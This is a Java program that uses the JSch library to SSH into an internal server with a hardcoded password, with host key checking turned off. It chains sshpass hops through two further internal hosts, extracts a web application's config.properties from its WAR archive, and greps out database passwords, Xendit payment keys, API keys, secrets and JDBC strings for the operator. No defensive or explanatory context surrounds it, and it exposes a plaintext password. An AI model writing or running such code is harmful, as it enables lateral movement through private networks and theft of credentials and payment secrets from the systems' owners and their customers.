import com.jcraft.jsch.*;
import java.io.*;
class XME {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    ChannelExec ch = (ChannelExec) jump.openChannel("exec");
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.117 'sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.186 \"cd /tmp;/usr/lib/jvm/java-1.8.0-amazon-corretto/bin/jar xf /progs/noxify/noxify-app/tomcat/7.0.109/webapps/noxify/noxify-app.war WEB-INF/classes/config.properties 2>/dev/null;cat WEB-INF/classes/config.properties 2>/dev/null | grep -iE \\\"db\\\\.\\\\|pass\\\\|xendit\\\\|xnd_\\\\|api.key\\\\|secret\\\\|jdbc\\\\|ENC(\\\" | head -30\" 2>&1' 2>&1 | head -40");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    jump.disconnect();
  }
}
